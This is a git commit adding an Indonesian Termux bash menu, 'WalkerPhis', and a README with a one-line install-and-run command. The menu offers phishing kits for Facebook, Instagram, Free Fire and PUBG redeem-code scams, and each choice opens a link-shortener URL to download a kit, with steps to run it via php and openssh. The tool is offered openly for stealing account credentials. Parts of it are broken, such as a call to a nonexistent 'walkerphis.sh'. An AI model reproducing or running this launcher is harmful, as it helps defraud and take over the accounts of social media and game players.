c12e3b994b9c464a4aea987b7af7c53eb03ad0d9
CyberTCA <54911320+CyberTCA@users.noreply.github.com>
2019-09-25 10:06:54 +0700

    Add files via upload

---
+++ README.md
@@ -0,0 +1,4 @@
+# Phising Game : FRE FIRE
+# Contac Me :+6283813844572
+jalankan tools
+$ apt update & apt upgrade & pkg install git & pkg install curl & git clone https://github.com/CyberTCA/Phising-Game & ls & cd Phising-Game & bash phising.sh
---
+++ phising.sh
@@ -0,0 +1,154 @@
+#!/bin/bash
+clear
+printf "\e[5;34m.....................WalkerPhis....................
+
+# Coded by   : \e[5;33mMr.Tcg Cyber
+\e[5;34m# My Team    : \e[5;33mL C I
+\e[5;34m# Contact    : \e[5;33m+6283813844572
+
+\e[5;34m...................................................
+            \e[7;32mcopyright ©2019 | 2-07-2019
+\e[5;31m===================================================" 
+printf "
+[1] Pishing Facebook Real
+[2] Pishing Instagram Real
+[3] Pishing Free Fire Kode Redeem
+[4] Pishing Free Fire Jackpot
+[5] Pishing Pubg Kode Redeem
+[6] Subscribe my Channel
+[0] Keluar\n\n" | lolcat
+printf "[?] \e[5;32mPilih Nomor :\e[0m "
+read select
+if [ $select = 1 ] || [ $select = 01 ]
+then
+clear
+printf "# Download File Scriptnya
+# Ekstrak Filenya
+# Simpan Folder ke Internal Awal
+# buka termux
+# pkg install php
+# pkg install openssh
+# cd /sdcard/facebook-real
+# bash fb.sh\n\n " | lolcat
+printf "[!] \e[5;31mDownload File? (y/n) :\e[0m "
+read file1
+if [ $file1 = y ] || [ $file1 = Y ]
+then
+xdg-open https://linkduit.net/Dpxlj
+fi
+if [ $file1 = n ] || [ $file1 = N ]
+then
+bash walkerphis.sh
+fi
+fi
+
+
+
+if [ $select = 2 ] || [ $select = 02 ]
+then
+clear
+printf "# Download File Scriptnya
+# Ekstrak Filenya
+# Simpan Folder ke Internal Awal
+# buka termux
+# pkg install php
+# pkg install openssh
+# cd /sdcard/instagram
+# bash ig.sh\n\n" | lolcat
+printf "[!] \e[5;31mDownload File? (y/n) :\e[0m "
+read file2
+if [ $file2 = y ] || [ $file2 = Y ]
+then
+xdg-open https://linkduit.net/0Pe83
+fi
+if [ $file2 = n ] || [ $file2 = N ]
+then
+bash walkerphis.sh
+fi
+fi
+
+
+if [ $select = 3 ] || [ $select = 03 ]
+then
+clear
+printf "# Download File Scriptnya
+# Ekstrak Filenya
+# Simpan Folder ke Internal Awal
+# buka termux
+# pkg install php
+# pkg install openssh
+# cd /sdcard/FreeFire
+# bash FreeFire.sh\n\n" | lolcat
+printf "[!] Download File? (y/n) :\e[0m "
+read file3
+if [ $file3 = y ] || [ $file3 = Y ]
+then
+xdg-open https://linkduit.net/LOJFG
+fi
+if [ $file3 = n ] || [ $file3 = N ]
+then
+bash walkerphis.sh
+fi
+fi
+
+
+if [ $select = 4 ] || [ $select = 04 ]
+then
+clear
+printf "# Download File Scriptnya
+# Ekstrak Filenya
+# Simpan Folder ke Internal Awal
+# buka termux
+# pkg install php
+# pkg install openssh
+# cd /sdcard/jackpotff
+# bash FreeFire.sh\n\n" | lolcat
+echo "[!] Download File? (y/n) :\e[0m "
+read file4
+if [ $file4 = y ] || [ $file4 = Y ]
+then
+xdg-open https://linkduit.net/ruA96
+fi
+if [ $file4 = n ] || [ $file4 = N ]
+then
+bash walkerphis.sh
+fi
+fi
+
+
+if [ $select = 5 ] || [ $select = 05 ]
+then
+clear
+printf "# Download File Scriptnya
+# Ekstrak Filenya
+# Simpan Folder ke Internal Awal
+# buka termux
+# pkg install php
+# pkg install openssh
+# cd /sdcard/pubg
+# bash pubg.sh\n\n" | lolcat
+printf "[!] Download File? (y/n) :\e[0m "
+read file5
+if [ $file5 = y ] || [ $file5 = Y ]
+then
+xdg-open https://linkduit.net/7dzEv
+fi
+if [ $file5 = n ] || [ $file5 = N ]
+then
+bash walkerphis.sh
+fi
+fi
+
+
+
+if [ $select = 6 ] || [ $select = 06 ]
+then
+xdg-open https://www.youtube.com
+fi
+
+if [ $select = 0 ]
+then
+printf "By* sayanku😚"
+sleep 2
+login
+fi
